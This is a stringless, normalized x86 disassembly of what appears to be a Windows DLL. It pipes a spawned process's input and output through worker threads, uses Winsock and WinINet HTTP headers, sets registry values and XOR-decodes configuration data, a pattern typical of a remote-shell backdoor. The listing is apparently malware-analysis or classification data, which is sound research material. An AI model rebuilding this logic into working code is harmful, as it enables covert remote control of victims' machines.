mov edi [ edi ]
push 0x3
lea edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] r--data
call sub_10019b1d
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_1001a898
int3
mov ecx [ ebp - 0x18 ]
mov esi [ ebp - 0x1c ]
push ecx
call [ CloseHandle@IAT ]
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_1000ff40
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
mov esi ecx
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
push ebx
mov ebx [ ebp + 0x8 ]
cmp eax ebx
jae r-xdata
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
mov ecx [ ebp + 0x10 ]
or edx 0xffffffff
sub edx eax
cmp edx ecx
ja r-xdata
push r--data
call sub_10019141
cmp eax ecx
jb r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
push r--data
call sub_100190f4
cmp edx 0x8
jb r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
lea edi [ eax + ecx ]
cmp edi 0x7ffffffe
jbe r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_100190f4
cmp edx 0x8
jb r-xdata
mov edi [ esi + 0x10 ]
lea ecx [ ecx + edi * 2 ]
cmp ecx eax
jbe r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_100014e0
test edi edi
je r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
mov edx [ ebp + 0x10 ]
sub eax ecx
push edx
sar eax 0x1
push eax
mov eax [ ebp + 0x8 ]
push esi
push eax
mov ecx esi
call sub_100071a0
pop edi
pop esi
pop ebp
retn 0xc
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop ebx
mov eax esi
xor ecx ecx
pop edi
mov [ eax ] cx
pop esi
pop ebp
retn 0xc
mov eax [ esi ]
pop ebx
xor ecx ecx
mov [ eax ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
sub edx ebx
push edx
mov edx [ ebp + 0x10 ]
lea ecx [ ecx + ebx * 2 ]
push ecx
lea ecx [ ebx + edx ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_10001050
add esp 0xc
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ecx + ecx ]
mov ecx [ ebp + 0xc ]
push edx
push ecx
lea edx [ eax + ebx * 2 ]
push edx
call sub_10019cf0
add esp 0xc
push edi
mov ecx esi
call sub_10001250
sub_10010090
push ebp
mov ebp esp
push 0xffffffff
push sub_1002cf20
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
mov ecx [ edi + 0x40 ]
mov edx [ ecx ]
mov eax [ edx ]
call eax
mov esi eax
cmp esi ebx
je r-xdata
push 0x6
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x24 ]
mov [ ebp + 0x8 ] r--data
call sub_10019b1d
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_1001a898
push 0x32
call [ Sleep@IAT ]
jmp r-xdata
mov edx [ esi + 0x10 ]
cmp edx ebx
jbe r-xdata
cmp [ edi + 0x40 ] ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push eax
call [ ExitThread@IAT ]
mov eax [ edi + 0x20 ]
push ebx
lea ebx [ ebp - 0x14 ]
push ebx
push edx
push ecx
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
xor ebx ebx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push esi
mov [ esi ] bl
call sub_10019ce4
add esp 0x4
mov ecx [ esi ]
push ecx
call sub_10019ce4
add esp 0x4
sub_10010180
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
mov eax edx
push esi
mov [ ebp - 0x4 ] 0x0
lea esi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x10 ]
sub eax esi
sar eax 0x1
push eax
push edx
push 0x0
call sub_1000ff40
mov esi [ ebp + 0x8 ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_10003860
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_100101e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002cf6f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor ebx ebx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ ebp - 0x254 ] esi
mov [ esi ] ax
push 0x18
mov [ ebp - 0x4 ] ebx
call sub_1001a818
add esp 0x4
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
xor edi edi
mov ecx eax
call sub_10012700
mov edi eax
jmp r-xdata
xor edx edx
cmp [ ebp - 0x23c ] 0x8
mov [ ebp - 0x220 ] 0x7
mov [ ebp - 0x224 ] ebx
mov [ ebp - 0x234 ] dx
mov [ ebp - 0x4 ] bl
jb r-xdata
mov ecx [ ebp - 0x234 ]
push ecx
call sub_10019ce4
add esp 0x4
push 0xc
push rw-data
mov ecx edi
mov [ ebp - 0x4 ] bl
call sub_10012790
push 0x12
push rw-data
mov ecx edi
call sub_10012770
push 0x206
lea edx [ ebp - 0x216 ]
xor ecx ecx
push ebx
push edx
mov [ ebp - 0x218 ] cx
call sub_1001a9b0
add esp 0xc
push 0x104
lea eax [ ebp - 0x218 ]
push eax
call [ GetSystemDirectoryW@IAT ]
lea ecx [ ebp - 0x250 ]
push ecx
mov ecx edi
call sub_10012c50
push eax
lea edx [ ebp - 0x218 ]
push edx
lea eax [ ebp - 0x234 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10010180
add esp 0xc
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_10003860
cmp [ ebp - 0x220 ] 0x8
jb r-xdata
cmp edi ebx
je r-xdata
mov eax [ ebp - 0x250 ]
push eax
call sub_10019ce4
add esp 0x4
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x34 ] ebx
mov [ esi + 0x3c ] ebx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x40 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
mov ecx edi
call sub_10012740
push edi
call sub_10019ce4
add esp 0x4
sub_10010370
push ebp
mov ebp esp
push 0xffffffff
push sub_1002cfae
mov eax [ fs : 0x0 ]
push eax
sub esp 0x84c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push 0x400
xor edi edi
lea eax [ ebp - 0x410 ]
push edi
push eax
mov [ ebp - 0x83c ] esi
call sub_1001a9b0
push 0x41e
lea ecx [ ebp - 0x830 ]
push edi
push ecx
call sub_1001a9b0
mov esi [ esi + 0x2c ]
add esp 0x18
push edi
push edi
lea edx [ ebp - 0x834 ]
push edx
push 0x400
lea eax [ ebp - 0x410 ]
push eax
push esi
mov [ ebp - 0x838 ] esi
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x6d
je r-xdata
lea ecx [ ecx ]
push edi
call [ ExitThread@IAT ]
int3
push 0x8
lea eax [ ebp - 0x83c ]
push eax
lea ecx [ ebp - 0x858 ]
mov [ ebp - 0x83c ] r--data
call sub_10019b1d
push r--data
lea ecx [ ebp - 0x858 ]
push ecx
call sub_1001a898
push 0x32
call [ Sleep@IAT ]
push 0x400
lea ecx [ ebp - 0x410 ]
push edi
push ecx
call sub_1001a9b0
add esp 0xc
push edi
lea edx [ ebp - 0x834 ]
push edx
push 0x400
lea eax [ ebp - 0x410 ]
push eax
push esi
call [ ReadFile@IAT ]
mov edx [ ebp - 0x834 ]
xor esi esi
cmp edx edi
jbe r-xdata
xor bl bl
cmp [ ebp - 0x834 ] edi
jbe r-xdata
push 0x1c
call sub_1001a818
mov esi eax
add esp 0x4
mov [ ebp - 0x840 ] esi
mov [ ebp - 0x4 ] edi
cmp esi edi
je r-xdata
lea eax [ ebp - 0x830 ]
xor esi esi
lea eax [ ebp - 0x830 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] edi
mov [ esi ] 0x0
lea edx [ eax + 0x1 ]
mov edi edi
mov [ eax ] cl
inc esi
inc eax
mov bl cl
cmp esi edx
jb r-xdata
cmp bl 0xd
je r-xdata
push 0x7
lea ecx [ ebp - 0x838 ]
push ecx
lea ecx [ ebp - 0x84c ]
mov [ ebp - 0x838 ] r--data
call sub_10019b1d
push r--data
lea edx [ ebp - 0x84c ]
push edx
call sub_1001a898
mov ecx [ eax + 0x40 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push esi
call eax
push 0x41e
lea ecx [ ebp - 0x830 ]
push edi
push ecx
call sub_1001a9b0
mov esi [ ebp - 0x838 ]
add esp 0xc
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x830 ]
push ecx
mov ecx esi
call sub_10007470
jmp r-xdata
mov cl [ ebp + esi - 0x410 ]
cmp cl 0xa
jne r-xdata
mov [ eax ] 0xd
inc eax
push edi
push edi
lea edx [ ebp - 0x834 ]
push edx
push 0x400
lea eax [ ebp - 0x410 ]
push eax
push esi
call [ PeekNamedPipe@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x83c ]
mov [ ebp - 0x4 ] 0xffffffff
cmp [ eax + 0x40 ] edi
je r-xdata
sub_100105a0
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
xor eax eax
mov esi ecx
push 0x0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
push ecx
lea eax [ esi + 0x20 ]
push eax
lea edi [ esi + 0x24 ]
push edi
mov [ ebp - 0x14 ] 0xc
mov [ ebp - 0xc ] 0x1
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
lea ebx [ esi + 0x28 ]
lea eax [ esi + 0x2c ]
push ebx
push eax
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
push 0x1
lea edx [ ebp - 0x8 ]
push edx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x8 ] r--data
call sub_10019b1d
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_1001a898
mov ecx [ ebx ]
mov edx [ edi ]
push ecx
push edx
mov ecx esi
call sub_1000fe60
mov edi [ CreateThread@IAT ]
mov [ esi + 0x1c ] eax
lea eax [ esi + 0x30 ]
push eax
push 0x0
push esi
push sub_10010090
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
call edi
mov [ esi + 0x34 ] eax
test eax eax
jne r-xdata
push 0x2
lea edx [ ebp - 0x8 ]
push edx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x8 ] r--data
call sub_10019b1d
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_1001a898
lea ecx [ esi + 0x3c ]
push ecx
push 0x0
push esi
push sub_10010370
push 0x0
lea edx [ ebp - 0x14 ]
push edx
call edi
mov [ esi + 0x38 ] eax
test eax eax
jne r-xdata
push 0x4
lea edx [ ebp - 0x8 ]
push edx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x8 ] r--data
call sub_10019b1d
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_1001a898
mov edx [ esi + 0x34 ]
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
mov eax [ esi + 0x1c ]
push ecx
push 0x3
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x18 ] eax
call [ WaitForMultipleObjects@IAT ]
sub eax 0x0
mov [ ebp - 0x4 ] 0x1
je r-xdata
push 0x5
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x8 ] r--data
call sub_10019b1d
push r--data
lea ecx [ ebp - 0x2c ]
push ecx
call sub_1001a898
mov ecx [ esi + 0x38 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
call [ GetExitCodeThread@IAT ]
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x38 ]
push edx
push eax
call [ TerminateThread@IAT ]
mov edx [ esi + 0x1c ]
lea ecx [ ebp - 0x4 ]
push ecx
push edx
call [ GetExitCodeProcess@IAT ]
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x1c ]
push eax
push ecx
dec eax
je r-xdata
mov edx [ esi + 0x34 ]
lea ecx [ ebp - 0x4 ]
push ecx
push edx
call [ GetExitCodeThread@IAT ]
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x34 ]
push eax
push ecx
call [ TerminateThread@IAT ]
mov eax [ esi + 0x1c ]
lea edx [ ebp - 0x4 ]
push edx
push eax
call [ GetExitCodeProcess@IAT ]
mov ecx [ ebp - 0x4 ]
mov edx [ esi + 0x1c ]
push ecx
push edx
jmp r-xdata
dec eax
jne r-xdata
call [ TerminateProcess@IAT ]
mov edx [ esi + 0x20 ]
mov ebx [ DisconnectNamedPipe@IAT ]
push edx
call ebx
mov eax [ esi + 0x20 ]
mov edi [ CloseHandle@IAT ]
push eax
call edi
mov ecx [ esi + 0x2c ]
push ecx
call ebx
mov edx [ esi + 0x2c ]
push edx
call edi
mov eax [ esi + 0x34 ]
push eax
call edi
mov ecx [ esi + 0x38 ]
push ecx
call edi
mov edx [ esi + 0x1c ]
push edx
call edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x38 ]
mov edi [ GetExitCodeThread@IAT ]
lea edx [ ebp - 0x4 ]
push edx
push eax
call edi
mov ecx [ ebp - 0x4 ]
mov edx [ esi + 0x38 ]
mov ebx [ TerminateThread@IAT ]
push ecx
push edx
call ebx
mov ecx [ esi + 0x34 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
call edi
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
push edx
push eax
call ebx
jmp r-xdata
sub_100107f0
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
push edi
cmp esi 0x4
jb r-xdata
test esi esi
je r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn
movzx eax [ edx ]
movzx edi [ ecx ]
sub eax edi
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
sar eax 0x1f
pop edi
or eax 0x1
pop esi
pop ebp
retn
cmp esi 0x1
jbe r-xdata
movzx eax [ edx + 0x1 ]
movzx edi [ ecx + 0x1 ]
sub eax edi
jne r-xdata
cmp esi 0x2
jbe r-xdata
movzx eax [ edx + 0x2 ]
movzx edi [ ecx + 0x2 ]
sub eax edi
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_10010870
push ebp
mov ebp esp
push 0xffffffff
push sub_1002cffb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push 0x18
mov [ ebp - 0x10 ] ebx
call sub_1001a818
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor edi edi
mov ecx eax
call sub_10012700
mov edi eax
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx edi
call sub_10012740
push edi
call sub_10019ce4
add esp 0x4
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
push edx
mov ecx edi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012b90
mov esi eax
cmp edi ebx
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp [ ebp - 0x10 ] 0x4
jb r-xdata
mov ecx 0xfffffffc
lea eax [ esi + 0x4 ]
sub ecx esi
mov edi 0xb
nop
lea ebx [ ecx + eax ]
and ebx 0x3
mov bl [ ebx + esi ]
xor [ eax ] bl
inc eax
dec edi
jne r-xdata
mov ecx [ rw-data ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov dl [ esi + 0x8 ]
cmp dl [ rw-data ]
jne r-xdata
mov cl [ esi + 0x9 ]
cmp cl [ rw-data ]
jne r-xdata
mov dl [ esi + 0xa ]
cmp dl [ rw-data ]
jne r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ ebp + 0x10 ]
add edi 0xfffffff5
push 0x1
push edi
mov [ eax ] edi
call sub_1001a8ef
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
push edi
lea ecx [ esi + 0xb ]
push ecx
push edi
push ebx
call sub_1001a92f
push esi
call sub_1001a3eb
add esp 0x14
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_100109b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d02e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x198
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea eax [ ebp - 0x1a0 ]
push eax
push 0x202
mov edi ecx
call WSAStartup
push 0x18
call sub_1001a818
add esp 0x4
mov [ ebp - 0x1a4 ] eax
xor esi esi
mov [ ebp - 0x4 ] esi
cmp eax esi
je r-xdata
push 0x1
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012840
mov ecx [ esi + 0x14 ]
push 0x40
push ecx
push 0x40
add edi 0x41
push edi
call sub_1001a92f
add esp 0x10
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
mov ecx eax
call sub_10012700
mov esi eax
sub_10010a90
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d07b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x18
call sub_1001a818
add esp 0x4
mov [ ebp - 0x58 ] eax
xor edi edi
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor esi esi
mov ecx eax
call sub_10012700
mov esi eax
jmp r-xdata
lea ecx [ ebp - 0x4c ]
push ecx
push 0xf003f
push edi
push eax
push 0x80000001
call [ RegOpenKeyExW@IAT ]
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x48 ]
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012790
push 0x78
push rw-data
mov ecx esi
call sub_10012770
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_10012c50
mov eax [ ebp - 0x48 ]
mov ebx 0x8
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4c ] edi
cmp [ ebp - 0x34 ] ebx
jae r-xdata
push 0x24
push rw-data
mov ecx esi
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x54 ] 0x4
call sub_10012770
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call sub_10012c50
mov [ ebp - 0x4 ] 0x2
cmp esi edi
je r-xdata
cmp [ ebp - 0x34 ] ebx
jb r-xdata
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] ebx
jae r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
xor al al
jmp r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10019ce4
add esp 0x4
lea ecx [ ebp - 0x54 ]
push ecx
lea edx [ ebp - 0x50 ]
push edx
push edi
push edi
push eax
mov eax [ ebp - 0x4c ]
push eax
call [ RegQueryValueExW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x50 ] edi
jne r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call [ RegCloseKey@IAT ]
cmp [ ebp - 0x18 ] ebx
jb r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x50 ] edi
cmp [ ebp - 0x18 ] ebx
jae r-xdata
mov edx [ ebp - 0x4c ]
push edx
call [ RegCloseKey@IAT ]
cmp [ ebp - 0x18 ] ebx
jb r-xdata
xor eax eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] ax
cmp [ ebp - 0x34 ] ebx
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
mov edx [ ebp - 0x4c ]
push 0x4
lea ecx [ ebp - 0x50 ]
push ecx
push 0x4
push edi
push eax
push edx
call [ RegSetValueExW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x2c ]
xor ecx ecx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] cx
cmp [ ebp - 0x34 ] ebx
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10019ce4
add esp 0x4
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10019ce4
add esp 0x4
xor al al
jmp r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call [ RegCloseKey@IAT ]
lea ecx [ ebp - 0x2c ]
call sub_100018c0
lea ecx [ ebp - 0x48 ]
call sub_100018c0
mov eax [ ebp - 0x4c ]
push eax
call [ RegCloseKey@IAT ]
lea ecx [ ebp - 0x2c ]
call sub_100018c0
lea ecx [ ebp - 0x48 ]
call sub_100018c0
xor al al
jmp r-xdata
mov al 0x1
mov edx [ ebp - 0x48 ]
push edx
call sub_10019ce4
add esp 0x4
jmp r-xdata
sub_10010cc0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d0ab
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
push 0x18
call sub_1001a818
add esp 0x4
mov [ ebp - 0x4c ] eax
xor esi esi
mov [ ebp - 0x4 ] esi
cmp eax esi
je r-xdata
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012790
push 0x8c
push rw-data
mov ecx esi
call sub_10012770
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call sub_10012c50
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov ecx eax
call sub_10012700
mov esi eax
mov edi [ HttpAddRequestHeadersW@IAT ]
push 0x20000000
push 0xffffffff
push eax
push ebx
call edi
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ eax ]
push 0x40
push rw-data
mov ecx esi
call sub_10012770
lea edx [ ebp - 0x2c ]
push edx
mov ecx esi
call sub_10012c50
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
push 0x20000000
push 0xffffffff
push eax
push ebx
call edi
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ eax ]
push 0x3e
push rw-data
mov ecx esi
call sub_10012770
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx esi
call sub_10012c50
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10019ce4
add esp 0x4
push 0x20000000
push 0xffffffff
push eax
push ebx
call edi
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ eax ]
push 0xa8
push rw-data
mov ecx esi
call sub_10012770
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_10012c50
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
push 0x20000000
push 0xffffffff
push eax
push ebx
call edi
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] dx
test esi esi
je r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10019ce4
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x4
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
sub_10010e70
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
push esi
push 0xffffffff
push 0x0
push eax
push 0x0
mov [ ebp - 0x4 ] 0x0
call sub_10007020
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_100076f0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_10010ec0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002cffb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
push 0x18
mov [ ebp - 0x10 ] edi
call sub_1001a818
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor esi esi
mov ecx eax
call sub_10012700
mov esi eax
jmp r-xdata
mov edi [ ebp - 0x10 ]
inc edi
push 0x1
push edi
call sub_1001a8ef
mov esi eax
mov eax [ ebp - 0x10 ]
push eax
push ebx
push edi
push esi
call sub_1001a92f
push ebx
call sub_1001a3eb
mov edi [ ebp + 0x8 ]
mov eax esi
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
add esp 0x1c
mov [ edi ] 0x0
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
push edx
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012bd0
mov ebx eax
cmp esi edi
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push esi
mov ecx edi
call sub_10007470
push esi
call sub_1001a3eb
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_10010fc0
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
lea eax [ ebx + 0x1 ]
push 0x1
xor esi esi
push eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] esi
call sub_1001a8ef
add esp 0x8
mov edi eax
test ebx ebx
je r-xdata
mov esi [ ebp + 0x8 ]
mov eax edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
